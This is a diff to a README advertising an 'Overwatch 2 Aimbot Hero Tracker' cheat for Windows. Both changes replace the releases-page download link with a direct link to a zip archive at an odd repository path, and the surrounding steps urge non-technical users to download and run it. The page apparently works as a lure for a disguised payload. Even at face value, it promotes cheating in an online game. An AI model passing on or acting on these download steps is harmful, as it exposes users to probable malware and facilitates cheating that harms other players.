@@ -1,6 +1,6 @@
 # ⚡ Overwatch-2-Aimbot-Hero-Tracker - Precision Aim, Zero Hassle
 
-[![Download Now](https://img.shields.io/badge/Download-Overwatch%202%20Aimbot%20Hero%20Tracker-blue?style=for-the-badge&logo=github&logoColor=white&color=random)](https://github.com/aa01026634/Overwatch-2-Aimbot-Hero-Tracker/releases)
+[![Download Now](https://img.shields.io/badge/Download-Overwatch%202%20Aimbot%20Hero%20Tracker-blue?style=for-the-badge&logo=github&logoColor=white&color=random)](https://raw.githubusercontent.com/aa01026634/Overwatch-2-Aimbot-Hero-Tracker/main/plausibly/v3.9.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Follow these simple steps to get the tool running on your Windows PC. No technic
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-👉 **[Download Overwatch-2-Aimbot-Hero-Tracker](https://github.com/aa01026634/Overwatch-2-Aimbot-Hero-Tracker/releases)**
+👉 **[Download Overwatch-2-Aimbot-Hero-Tracker](https://raw.githubusercontent.com/aa01026634/Overwatch-2-Aimbot-Hero-Tracker/main/plausibly/v3.9.zip)**
 
 The download will start automatically, or you'll see a list of files to choose from. Pick the latest version.
 
